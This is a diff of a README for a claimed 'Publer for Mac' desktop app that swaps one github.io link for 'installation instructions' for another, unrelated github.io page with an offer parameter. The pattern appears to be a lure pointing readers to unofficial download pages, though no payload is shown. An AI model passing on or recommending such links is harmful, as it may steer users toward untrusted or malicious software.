@@ -3,7 +3,7 @@
 
 Publer for Mac brings advanced social media scheduling and management directly to your desktop. With this desktop version, Mac users can easily plan, publish, and analyze content across multiple social platforms. Follow the guide below to set up and start using Publer on your Mac. 🚀
 
-[![Get Github Instruction](https://img.shields.io/badge/Get%20Installation%20Instruction-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://shieldbestplays13.github.io/.github/)
+[![Get Github Instruction](https://img.shields.io/badge/Get%20Installation%20Instruction-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-tool-install.github.io/.github/?offer=publer)
 
 ---
 
